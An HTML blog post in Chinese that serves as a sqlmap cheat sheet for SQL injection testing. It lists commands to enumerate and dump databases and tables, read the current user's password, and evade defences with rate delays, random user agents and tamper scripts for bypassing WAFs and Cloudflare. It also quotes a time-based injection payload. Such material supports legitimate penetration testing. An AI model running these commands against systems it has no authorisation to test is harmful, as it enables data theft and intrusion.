<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    
    <title>
        Sqlmap User Manua |
        
        SuperHua is Blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="常规使用 GET型  $ python3 sqlmap.py -u &quot;url&quot; --dbs  $ python3 sqlmap.py -u &quot;url&quot; -D &quot;库名&quot; --tables  $ python3 sqlmap.py -u &quot;url&quot; -D &quot;库名&quot; -T &quot;表名&quot; -">
<meta property="og:type" content="article">
<meta property="og:title" content="Sqlmap User Manua">
<meta property="og:url" content="https://superhuabigcake.github.io/2023/06/18/Sqlmap-User-Manua/index.html">
<meta property="og:site_name" content="SuperHua is Blog">
<meta property="og:description" content="常规使用 GET型  $ python3 sqlmap.py -u &quot;url&quot; --dbs  $ python3 sqlmap.py -u &quot;url&quot; -D &quot;库名&quot; --tables  $ python3 sqlmap.py -u &quot;url&quot; -D &quot;库名&quot; -T &quot;表名&quot; -">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://superhuabigcake.github.io/2023/06/18/Sqlmap-User-Manua/image-20240130100415228.png">
<meta property="article:published_time" content="2023-06-18T15:01:22.000Z">
<meta property="article:modified_time" content="2024-11-28T07:45:17.061Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Tools">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://superhuabigcake.github.io/2023/06/18/Sqlmap-User-Manua/image-20240130100415228.png">
    
    
    
        
            <link rel="stylesheet" href="https://superhuabigcake.github.io/css/markdown.css">
        
            <link rel="stylesheet" href="https://superhuabigcake.github.io/css/july.css">
        
    
<meta name="generator" content="Hexo 6.3.0"></head>
<body>

<div id="banner-outer" class="hidden">
    <div id="banner-image" style="background-image: url()"></div>
    <img src="https://s1.ax1x.com/2023/06/18/pClXj4s.jpg" id="avatar">
</div>

<div id="menu-outer">
    <div id="menu-inner">
        
            <a class="false" href="https://superhuabigcake.github.io/index.html">Home</a>
        
            <a class="false" href="https://superhuabigcake.github.io/archives/index.html">Archives</a>
        
            <a class="false" href="https://superhuabigcake.github.io/about/index.html">About</a>
        
    </div>
</div>

<div id="content-outer" class="container">
    <div id="content-inner">
        <article id="post">
    <h1 id="post-title">Sqlmap User Manua</h1>
    <time id="post-date" datetime="2023-06-18T15:01:22.000Z">
        June 18, 2023
    </time>
    <div id="post-content" class="markdown-body">
        <h1 id="常规使用"><a href="#常规使用" class="headerlink" title="常规使用"></a>常规使用</h1><ul>
<li><strong>GET型</strong></li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -u &quot;url&quot; --dbs

$ python3 sqlmap.py -u &quot;url&quot; -D &quot;库名&quot; --tables

$ python3 sqlmap.py -u &quot;url&quot; -D &quot;库名&quot; -T &quot;表名&quot; --columns

$ python3 sqlmap.py -u &quot;url&quot; -D &quot;库名&quot; -T &quot;表名&quot; -C &quot;字段名1,字段名2&quot; --dump
</code></pre>
<p>如果表中的字段特别多，但是又想全部查看的话，可以直接使用<code>--dump</code>参数</p>
<pre><code class="bash">$ python3 sqlmap.py -u &quot;url&quot; -D &quot;库名&quot; -T &quot;表名&quot; --dump
</code></pre>
<ul>
<li><strong>POST型</strong></li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --dbs

$ python3 sqlmap.py -r 1.txt -D &quot;库名&quot; --tables

$ python3 sqlmap.py -r 1.txt -D &quot;库名&quot; -T &quot;表名&quot; --columns

$ python3 sqlmap.py -r 1.txt -D &quot;库名&quot; -T &quot;表名&quot; -C &quot;字段1,字段2&quot; --dump
</code></pre>
<p>同理，最后可以直接<code>--dump</code></p>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt -D &quot;库名&quot; -T &quot;表名&quot; --dump
</code></pre>
<h1 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h1><h3 id="探测等级"><a href="#探测等级" class="headerlink" title="# 探测等级"></a># 探测等级</h3><p>在sqlmap中存在探测等级，探测等级越高那么探测的东西就会更多，不指定的话默认为1级，最高为5。</p>
<p>随着探测等级越来越高，所需要花费的时间就会更多</p>
<ul>
<li>–level 2</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --level 2
</code></pre>
<p>当探测等级为2时，会探测数据包中的<code>cookie</code>值是否存在注入</p>
<ul>
<li>–level 3</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --level 3
</code></pre>
<p>当探测等级为3时，会探测数据包中的<code>User-Agent、Referer</code>值是否存在注入</p>
<ul>
<li>–level 5</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --level 5
</code></pre>
<p>其中–level 5包含的Payload最多，会探测数据包中所有可能存在注入的参数，例如会探测<code>Host</code>值是否存在注入</p>
<h3 id="语句复杂度"><a href="#语句复杂度" class="headerlink" title="# 语句复杂度"></a># 语句复杂度</h3><p>该参数决定了sqlmap语句的复杂度，与探测等级一样，最低为1级，最高为5级，等级越高语句会越复杂，有的地方可以对正常的语句不生效，需要有特殊的语句触发时才能有效，等级越高，越容易检测出漏洞</p>
<ul>
<li>–risk 3</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --risk 3
</code></pre>
<p>通常来说，语句复杂度搭配探测等级来使用</p>
<ul>
<li>–risk 3 –level 3</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --risk 3 --level 3
</code></pre>
<p>探测等级3级，复杂程度3级在进入sql注入中是比较常见的级别</p>
<h3 id="指定注入类型"><a href="#指定注入类型" class="headerlink" title="# 指定注入类型"></a># 指定注入类型</h3><p>sql注入中存在多种注入类型，当然sqlmap也可以使用参数来执行当前sqlmap测试怎样类型的注入</p>
<ul>
<li>–technique B：布尔盲注</li>
<li>–technique E：报错注入</li>
<li>–technique U：联合查询注入</li>
<li>–technique S：堆叠注入</li>
<li>–technique T：时间盲注</li>
<li>–technique Q：内联查询注入</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --technique T
</code></pre>
<h3 id="设置速率"><a href="#设置速率" class="headerlink" title="# 设置速率"></a># 设置速率</h3><p>sqlmap在探测中会有大量的payload发送到目标网站，如果默认情况会使用过快的发包速度，从而导致网站采取预警措施，如果在探测的时候控制sqlmap的发包延时，这种情况可以得到有效的避免</p>
<ul>
<li>–delay</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --delay 1
</code></pre>
<p>每次发包的延时为1秒</p>
<h3 id="设置线程"><a href="#设置线程" class="headerlink" title="# 设置线程"></a># 设置线程</h3><pre><code class="bash">$ python3 sqlmap.py -r 1.txt --threads=10 --batch --proxy=http://127.0.0.1:8080
</code></pre>
<ul>
<li>–threads&#x3D;number：线程</li>
</ul>
<h3 id="随机ua头"><a href="#随机ua头" class="headerlink" title="# 随机ua头"></a># 随机ua头</h3><ul>
<li>–random-agent</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --random-agent
</code></pre>
<h3 id="SSL证书错误"><a href="#SSL证书错误" class="headerlink" title="# SSL证书错误"></a># SSL证书错误</h3><p>强制使用HTTPS模式访问</p>
<ul>
<li>–force-ssl</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --force-ssl
</code></pre>
<h3 id="无法注出数据"><a href="#无法注出数据" class="headerlink" title="# 无法注出数据"></a># 无法注出数据</h3><p>如果确实可以检测到注入，但是无法注入出数据，那么可能被waf拦截了关键字，尝试使用<code>tamper</code>脚本绕过</p>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --tamper=between
</code></pre>
<h3 id="设置proxy代理"><a href="#设置proxy代理" class="headerlink" title="# 设置proxy代理"></a># 设置proxy代理</h3><pre><code class="bash">$ python3 sqlmap.py -r 1.txt --proxy &quot;http://127.0.0.1:8080&quot;
</code></pre>
<h3 id="查看当前数据库"><a href="#查看当前数据库" class="headerlink" title="# 查看当前数据库"></a># 查看当前数据库</h3><p>当我们需要寻找网站后台密码时，由于数据库比较多，一个个找又太浪费时间，可以使用参数查看当前数据库</p>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --current-db
</code></pre>
<h3 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="# 查看当前用户"></a># 查看当前用户</h3><pre><code class="bash">$ python3 sqlmap.py -r 1.txt --current-user
</code></pre>
<h3 id="查看当前用户的密码"><a href="#查看当前用户的密码" class="headerlink" title="# 查看当前用户的密码"></a># 查看当前用户的密码</h3><pre><code class="bash">$ python3 sqlmap.py -r 1.txt --current-password
</code></pre>
<h3 id="0’XOR-if-now-x3D-sysdate-sleep-6-0-XOR’Z"><a href="#0’XOR-if-now-x3D-sysdate-sleep-6-0-XOR’Z" class="headerlink" title="# 0’XOR(if(now()&#x3D;sysdate(),sleep(6),0))XOR’Z"></a># 0’XOR(if(now()&#x3D;sysdate(),sleep(6),0))XOR’Z</h3><p>遇到这种注入的Payload</p>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --dbms=mysql --technique=T --tamper=between,space2comment
</code></pre>
<blockquote>
<p>官方说明:<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/issues/4091">https://github.com/sqlmapproject/sqlmap/issues/4091</a></p>
</blockquote>
<p>或者使用 ghauri 这款工具</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/r0oth3x49/ghauri">https://github.com/r0oth3x49/ghauri</a></p>
</blockquote>
<p><img src="/2023/06/18/Sqlmap-User-Manua/image-20240130100415228.png" alt="image-20240130100415228"></p>
<h3 id="指定数据库类型"><a href="#指定数据库类型" class="headerlink" title="# 指定数据库类型"></a># 指定数据库类型</h3><p>以下是举例部分数据库类型</p>
<ul>
<li>MySQL</li>
<li>Oracle</li>
<li>PostgreSQL</li>
<li>Microsoft SQL Server</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --dbms=Microsoft SQL Server
</code></pre>
<h3 id="Bypass-CF"><a href="#Bypass-CF" class="headerlink" title="# Bypass CF"></a># Bypass CF</h3><pre><code class="bash">$ python3 sqlmap.py -r 1.txt --tamper=&quot;between,randomcase,space2comment&quot; --batch --random-agent
</code></pre>
<h3 id="清除缓存"><a href="#清除缓存" class="headerlink" title="# 清除缓存"></a># 清除缓存</h3><p>清除网站的缓存</p>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --flush-session
</code></pre>
<h3 id="禁止URL编码"><a href="#禁止URL编码" class="headerlink" title="# 禁止URL编码"></a># 禁止URL编码</h3><ul>
<li>–skip-urlebcode</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --skip-urlebcode
</code></pre>
<h3 id="爬取"><a href="#爬取" class="headerlink" title="# 爬取"></a># 爬取</h3><ul>
<li>–crawl：指定爬取深度（例如：指定值为 2 表示让 SQLMap 最多爬取两层目录）</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --skip-urlebcode --crawl=2
</code></pre>
<p>如果想排除爬取范围内的任意页面，我们可以通过使用 –crawl-exclude 参数</p>
<pre><code class="bash">$ python3 sqlmap.py -r 1.txt --skip-urlebcode --crawl=2 --crawl-exclude=”logout”
</code></pre>
<p>该命令可以最多爬取三层目录，并排除任何存在 “logout”(注销) 关键字的 URL</p>
<h3 id="表单"><a href="#表单" class="headerlink" title="# 表单"></a># 表单</h3><ul>
<li>–forms：针对 -u 参数url获取页面中的from表单进行测试</li>
</ul>
<pre><code class="bash">$ python3 sqlmap.py -u &quot;http://127.0.0.1&quot; --forms
</code></pre>

    </div>
</article>

<div id="paginator">
    
</div>

    </div>
</div>

<div id="bottom-outer">
    <div id="bottom-inner">
        2019-2025 John Doe 
    </div>
</div>

<div id="to-top">
    <i class="iconfont icon-up"></i>
</div>


    
        <script src="https://superhuabigcake.github.io/js/jquery-3.4.1.min.js"></script>
    
        <script src="https://superhuabigcake.github.io/js/highlight-9.13.1.min.js"></script>
    
        <script src="https://superhuabigcake.github.io/js/transition.js"></script>
    
        <script src="https://superhuabigcake.github.io/js/smooth-scroll.min.js"></script>
    



    <script>
      $(function () {
        $('#banner-outer').addClass('fade-out')
        $('#menu-outer').addClass('fade-show')

        $('pre').each(function (i, block) {
          hljs.highlightBlock(block);
        });
      })
    </script>


<script>
  $(function () {
    $(window).scroll(function () {
      if ($(window).scrollTop() > 150) {
        $("#to-top").fadeIn();
      } else {
        $("#to-top").fadeOut();
      }
    });
    $("#to-top").click(function () {
      $("body,html").animate({scrollTop: 0}, 500);
      return false;
    })
  })
</script>
</body>
</html>
